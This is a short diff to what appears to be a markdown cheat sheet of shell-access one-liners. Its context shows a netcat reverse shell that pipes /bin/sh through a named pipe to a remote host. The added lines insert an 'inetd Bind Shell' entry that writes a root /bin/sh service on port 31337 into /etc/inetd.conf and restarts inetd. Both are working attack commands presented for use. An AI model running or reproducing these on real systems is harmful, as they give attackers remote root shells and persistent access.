@@ -105,7 +105,10 @@ NC v2
 ```bash
 rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc $hip $hport >/tmp/f
 ```
-
+inetd Bind Shell
+```bash
+echo '31337 stream tcp nowait root /bin/sh -i' >> /etc/inetd.conf && /etc/init.d/inetd restart
+```
 
 ## Upgrades
 
